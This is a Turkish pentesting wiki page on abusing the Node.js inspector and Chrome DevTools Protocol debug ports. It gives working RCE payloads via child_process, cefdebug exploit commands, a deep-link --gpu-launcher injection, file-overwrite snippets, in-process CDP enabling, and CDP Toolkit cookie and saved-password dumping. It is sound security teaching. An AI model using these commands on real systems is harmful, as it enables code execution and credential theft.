# Node inspector/CEF debug kötüye kullanımı

{{#include ../../banners/hacktricks-training.md}}

Geçmişteki pratik örnekler arasında Multimaster walkthrough ve CVE-2019-1414 Visual Studio Code debugger saldırısı bulunur; bunları sürüme özgü bağlam olarak değerlendirin ve güncel her Electron veya Chromium hedefinin aynı primitive’leri sunduğunu varsaymayın.<sup>[[1]](#references)[[3]](#references)</sup>

## Temel Bilgiler

[Belgelerden](https://nodejs.org/learn/getting-started/debugging): `--inspect` anahtarıyla başlatıldığında bir Node.js süreci, bir debugging client’ı için dinlemeye başlar. **Varsayılan olarak**, **`127.0.0.1:9229`** host ve portunda dinler. Her sürece ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Bağlanmak için inspector client’larının host adresini, portu ve UUID’yi bilmesi ve belirtmesi gerekir. Tam URL şu biçimde görünür: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör, Node.js süreci adına rastgele kod çalıştırabilir (**potansiyel ayrıcalık yükseltme**).<sup>[[4]](#references)</sup>

Inspector’ı başlatmanın birkaç yolu vardır:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

İncelenen bir işlemi başlattığınızda şöyle bir şey görünür:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF** (**Chromium Embedded Framework**) tabanlı süreçler, `--remote-debugging-port=9222` ile bir debugger açığa çıkarabilir. Bu, tarayıcıyı Node.js inspector yerine [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden erişilebilir kılar; bu nedenle Node.js `process` tabanlı payload'lar varsayılan olarak doğrudan uygulanamaz.<sup>[[2]](#references)[[5]](#references)</sup>

Debug modunda bir tarayıcı başlattığınızda şöyle bir şey görünür:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP uç noktasını listeleme ve kullanma

HTTP keşif uç noktaları **browser** WebSocket'i ile ayrı **target** (sekme, worker, extension vb.) WebSocket'lerini birbirinden ayırır. Browser uç noktası için `/json/version`, target'lar için `/json/list` sorgulanır; döndürülen `webSocketDebuggerUrl` değerleri daha sonra CDP'nin JSON-RPC benzeri mesajlarıyla doğrudan kullanılabilir.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Örneğin, `websocat "$BROWSER_WS"` ile bağlanıp `{"id":1,"method":"Target.getTargets"}` veya `{"id":2,"method":"Storage.getCookies"}` gönderin. Bir sayfa hedefinde (`websocat "$PAGE_WS"`), `Runtime.evaluate` ilgili renderer'da çalıştırılır ve `Page.captureScreenshot` base64 kodlu bir ekran görüntüsü döndürür. `document.cookie`, `HttpOnly` çerezlerini gösteremez; `Storage.getCookies` ise tarayıcıdan çerez deposunu ister.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Tarayıcılar, WebSockets ve same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Bir web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger oturum kimliği edinmek** için **ilk HTTP bağlantısı** gereklidir. **Same-origin policy**, web sitelerinin **bu HTTP bağlantısını** kurmasını **engeller**. [**DNS rebinding saldırılarına**](https://en.wikipedia.org/wiki/DNS_rebinding)** karşı** ek güvenlik sağlamak için Node.js, bağlantının **'Host' başlıklarının** ya bir **IP adresi** ya da tam olarak **`localhost`** belirttiğini doğrular.<sup>[[4]](#references)</sup>

> [!TIP]
> Bu **güvenlik önlemleri**, yalnızca **bir HTTP isteği göndererek** (bir SSRF açığı istismar edilerek yapılabilir) kod çalıştırmak için **inspector'ın istismar edilmesini engeller**.<sup>[[4]](#references)</sup>

### Çalışan süreçlerde inspector'ı başlatma

Çalışan bir nodejs sürecine **SIGUSR1 sinyalini** göndererek **varsayılan portta inspector'ı başlatmasını** sağlayabilirsiniz. Ancak yeterli ayrıcalıklara sahip olmanız gerektiğini unutmayın; bu size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir, ancak doğrudan bir ayrıcalık yükseltmesi sağlamaz.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Bu, container'larda kullanışlıdır çünkü `--inspect` ile **process'i kapatıp yenisini başlatmak** **bir seçenek değildir**; process ile birlikte **container** da **sonlandırılır**.<sup>[[6]](#references)</sup>

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser'a** bağlanmak için Chrome'da `chrome://inspect`, Edge'de ise `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olun. Görselde bir Uzaktan Kod Çalıştırma (RCE) örneği gösterilmektedir:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger'a erişmek için kullanılacak URL görünecektir. Örneğin ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: Chromium tabanlı bir browser'a bağlanmak için,...](<../../images/image (674).png>)

**Komut satırını** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspector'ları bulmayı** ve bunlara **kod enjekte etmeyi** sağlar.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (ilginç kullanım alanları bulmak için API'yi incelemeniz gerekir).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> [**Electron'da bir XSS'ten RCE elde etmenin**](../../desktop-application-security/electron-desktop-apps/index.html) yolunu arıyorsanız bu sayfaya göz atın.

Bir Node **inspector**'a **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından bazıları şunlardır (görünüşe göre bu, **Chrome DevTools protocol** bağlantısında **çalışmaz**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payload'ları

API'yi burada inceleyebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Bu bölümde, insanların bu protokolü istismar etmek için kullandığını gördüğüm ilginç yöntemleri listeleyeceğim.

### Chrome 136+ varsayılan profil kısıtlaması

**Chrome 136** sürümünden itibaren Chrome, **varsayılan Chrome veri dizinini** hedeflediklerinde `--remote-debugging-port` ve `--remote-debugging-pipe` seçeneklerini yok sayar. Bu seçenek, ayrı bir şifreleme anahtarı ve yalıtılmış tarayıcı durumu sayesinde basit bayrak tabanlı tekniğin kullanıcının normal, kimliği doğrulanmış profilini açığa çıkarmasını önleyen standart dışı bir `--user-data-dir` ile birlikte kullanılmalıdır. Bu Chrome'a özgü kısıtlamanın, doğrulamadan eski Chrome sürümlerini, Chrome for Testing'i, Electron/CEF uygulamalarını veya diğer Chromium türevlerini de kapsadığı varsayılmamalıdır.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Bu nedenle, yalnızca `--remote-debugging-port` ile başlatılmış güncel bir Chrome sürecini görmek, CDP'nin etkinleştiğini **kanıtlamaz**. Dinleyiciyi ve `/json/version`'ı doğrulayın ve hangi profilin bunu gerçekten desteklediğini belirleyin.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI'yi (workspaces://index.html) **kaydettiğini**; bu URI'nin tamamını aldığını ve ardından URI'den kısmen oluşturulan bir yapılandırmayla **CEF tabanlı uygulamayı başlattığını** keşfetti.<sup>[[8]](#references)</sup>

URI parametrelerinin URL decoding işleminden geçirildiği ve CEF tabanlı uygulamayı başlatmak için kullanıldığı keşfedildi. Bu, kullanıcının komut satırına **`--gpu-launcher`** bayrağını **ekleyerek** keyfi işlemler yürütmesine olanak tanıyordu.<sup>[[8]](#references)</sup>

Dolayısıyla, aşağıdaki gibi bir payload:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe çalıştırır.<sup>[[8]](#references)</sup>

### Dosyaların Üzerine Yazma

**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **kaynak kodunun** üzerine **kötü amaçlı kodunuzu** yazmak için bir dosya indirin.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE ve veri sızdırma

STAR Labs, dışarıya açık WebDriver/CDP servislerinin rastgele dosya okumaya ve RCE'ye olanak sağlayabileceğini gösterdi; bazı yapılandırmalarda DNS rebinding exploit zincirini tamamlayabilir.<sup>[[9]](#references)</sup>

ChromeDriver'ın WebDriver servisi, Chrome DevTools/CDP'den ayrıdır. [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities), yeni bir session için başlatılacak browser executable'ını seçer. Yetkisiz bir caller, root olarak çalışan ChromeDriver servisine erişip caller'ın kontrolündeki bir executable path'i içeren session isteği gönderebiliyorsa, bu başlatma servisinin privilege sınırını aşabilir. Boş bir `/sessions` yanıtı, yeni session oluşturulup oluşturulamayacağını kesinleştirmez. Bu yolun kullanılabilir olduğu sonucuna varmadan önce process sahibini, gerçek listener erişimini, session authorization'ını, executable erişimini ve confinement'ı inceleyin; yalnızca process adı veya yaygın bir port yeterli değildir. [Google'ın güvenlik yönergeleri](https://developer.chrome.com/docs/chromedriver/security-considerations), ChromeDriver'ın yetkisiz bir hesapla çalıştırılmasını önerir. Pasif enumeration, WebDriver session'ı oluşturmamalıdır.

Tarihî browser automation ve Chromium güvenlik vakaları için Counter WebDriver yazısına ve Project Zero'nun 773, 1742 ve 1944 numaralı sorunlarına bakın.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Çalışan bir Chromium process'inde CDP'yi etkinleştirme

Chrome'un varsayılan profil kısıtlaması yalnızca komut satırı üzerinden etkinleştirme yolunu engeller. Browser process'ini değiştirmek için yeterli same-user erişimi varsa, orijinal [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ve Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF), Chromium'un dışa aktarılmamış `content::DevToolsAgentHost::StartRemoteDebuggingServer` fonksiyonunu hâlihazırda çalışan `chrome.exe` veya `msedge.exe` içinde çağırır. Böylece endpoint gerçek profile ait olur ve sekmeleri, extensions'ları, cookies'leri ve authenticated state'i korur.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Standart x64 Chrome/Edge process'lerinde BOF, browser window'u ve yüklenmiş `chrome.dll`/`msedge.dll` dosyasını bulur, remote PE'yi maskelenmiş signatures için tarar, stubs ve bir context block ayırır, window procedure'ü geçici olarak değiştirir ve son çağrıyı browser **UI thread** üzerinde çalıştırır. İlgili runtime girdileri `StartRemoteDebuggingServer`, Chromium'un `operator new` fonksiyonu, `TCPServerSocketFactory::CreateForHttpServer` ve factory vtable'ıdır. Zorunlu signatures'lardan herhangi biri için tekil bir eşleşme bulunamazsa işlem durur.<sup>[[15]](#references)[[16]](#references)</sup>

BOF, browser mode'u ve isteğe bağlı bir portu kabul eder. Ardından helper script endpoint'i doğrulayabilir ve cookies'leri toplayabilir; `chrome-iso`, Chrome'un Windows Process Isolation sınırı için ayrı bir yoldur.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` yolu, yalıtılmış sürece yalnızca sorgu ile sınırlı tanıtıcılar kullanır. Canlı sürecin PE görüntü boyutuyla eşleşen yüklü `chrome.dll` dosyasını belirler, sembolleri bu yerel görüntüden çözümler ve UI thread'ine ulaşmak için Chromium'un `WindowImpl` dispatch mekanizmasını, senkron `WM_COPYDATA`'yı ve mevcut bir User32 hook'unu kullanır.<sup>[[16]](#references)</sup>

> [!WARNING]
> Bu, kimlik doğrulaması gerektirmeyen bir ağ bypass'ı değil, **sistem ele geçirildikten sonra tarayıcı sürecinin manipüle edilmesi** tekniğidir. İlgili C++ sembolleri dışa aktarılmadığından ve tarayıcı güncellemelerinden sonra değişebildiğinden, tekniğin çalışması kullanılan build'e bağlıdır.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Tarayıcı güncellemelerinden sonra imzaları yenileme

Hedefte yüklü olan `chrome.dll` veya `msedge.dll` dosyasının tam sürümünü ve ona karşılık gelen PDB'yi kullanın. Windows SDK'daki `symchk.exe` sembolleri indirir; ardından repository script'leri `StartRemoteDebuggingServer`'ı bulur, allocator/socket-factory girdilerini belirler veya BOF'a gömülü tüm imzaları doğrular.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Sıfır eşleşme veya birden fazla eşleşme sonucu, rastgele bir adresle değiştirilmemelidir. Bilinen bir `operator new` veya `CreateForHttpServer` kalıbı yeni bir maske oluşturamayacak kadar değiştiyse, bu sembolü incelemek ve hedef modülde benzersiz bir bayt dizisi türetmek için PDB ile `pe_signature_finder.py` kullanın.<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkit ile kimliği doğrulanmış tarayıcıdan çıkarım

Bu teknik, App-Bound Encryption (ABE) şifrelemesini çevrimdışı çözmez veya cihaz bağını kaldırmaz. Bunun yerine, meşru tarayıcıyı **bir şifre çözme oracle'ı ve kimliği doğrulanmış bir etkileşim proxy'si** olarak kullanır: `Storage.getCookies` canlı tarayıcıdan çerez deposunu isterken, gezinme ve screencast iş akışları istekleri, depolamayı, kurumsal kimlik doğrulamayı ve cihaza bağlı davranışları kurbanın mevcut tarayıcısında tutar.<sup>[[17]](#references)[[18]](#references)</sup>

Loopback CDP dinleyicisini operatörün pivot'u üzerinden yönlendirdikten sonra, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) yaygın yapıları sıralayıp toplayabilir.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` ve `tabs screenshot`, çoğunlukla `/json/version`, hedef listesi, `Storage.getCookies` ve `Page.captureScreenshot` için kullanılan wrapper'lardır. History, bookmarks, extensions ve password metadata ise geçici bir `chrome://`/`edge://` WebUI hedefi gerektirir: toolkit, arayüzün render edilmesini bekler, modelini veya DOM'unu inceler, sonucu toplar ve hedefi kapatır.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` daha ileri gider: gerçek kayıtlı giriş origin'ini açar, bir kimlik bilgisi alanına odaklanır, CDP input event'lerini kullanarak yerel autofill önerisini seçer ve doldurulan değerleri okur. Origin/port/path, kayıtlı parola realm'iyle yakından eşleşmelidir; öneri popup'ı yerel tarayıcı arayüzü olduğundan görünür mod güvenilir varsayılandır.<sup>[[17]](#references)[[18]](#references)</sup>

Canlı etkileşim için `browser-takeover screencast`, kareleri aktarır ve gerçek bir hedefe (arka plan veya ekran dışı modlar dahil) input gönderir. `browser-takeover proxy` ise HTTP ve HTTPS `CONNECT` isteklerini yerel olarak kabul eder ve üst sunucu isteklerini gizli Chrome hedefleri üzerinden gerçekleştirir; gizli hedeflerin kullanılamadığı durumlarda arka plan sekmelerine geçer. Bu yöntem kurbanın ağ/kimlik doğrulama bağlamını korur; ancak döndürülen içeriği operatörün tarayıcısı render ettiği için karmaşık istemci tarafı uygulamalarda daha az aslına uygundur.<sup>[[17]](#references)[[18]](#references)</sup>

Tespit için yalnızca `--remote-debugging-*` komut satırı telemetrisine güvenmeyin: olağandışı handle'ları ve bellek işlemlerini de tarayıcı süreçleriyle (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread oluşturma), DLL injection ve Chrome/Edge'in sahip olduğu beklenmedik loopback dinleme soketleriyle ilişkilendirin.<sup>[[15]](#references)</sup>

### Post-Exploitation

Gerçek bir ortamda, Chromium tabanlı bir tarayıcı kullanan kullanıcı PC'sini **ele geçirdikten sonra**, geçmişte kullanılan bir teknik, tarayıcıyı debugging etkin olarak yeniden başlatmak ve loopback portunu iletmekti. Bu, seçilen profili hâlâ kabul eden ürünlerde/build'lerde kurbanın tarama durumunu açığa çıkarabilir; ancak Chrome 136+ bunu varsayılan veri dizinine karşı uygulamaz.<sup>[[7]](#references)[[14]](#references)</sup>

Orijinal yeniden başlatma komutu eski/sürüme özgü hedefler için aşağıda korunmuştur. İkinci komut, desteklenen güncel Chrome biçimidir; ancak kurbanın normal kimliği doğrulanmış durumunu yeniden açmak yerine yalıtılmış bir profil oluşturur.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS'e özgü Chromium yeniden başlatma, extension ve CDP teknikleri için bkz. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inceleme ve exploit aracı](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger üzerinden Visual Studio Code'da uzaktan kod yürütme](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Başlangıç](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome'un Debugging özelliğini kötüye kullanarak tarama oturumlarını uzaktan gözlemleme ve kontrol etme](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces uzaktan kod yürütme](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Benimle mi konuşuyorsun? - DNS Rebinding ve CDP üzerinden WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot'tan RCE'ye](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Güvenliği artırmak için uzaktan hata ayıklama anahtarlarında yapılan değişiklikler - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Çalışan bir Edge Browser'a CDP enjekte etme: Çalışma zamanı tarayıcı enstrümantasyonuna derinlemesine bakış](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster'ın dönüşü](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
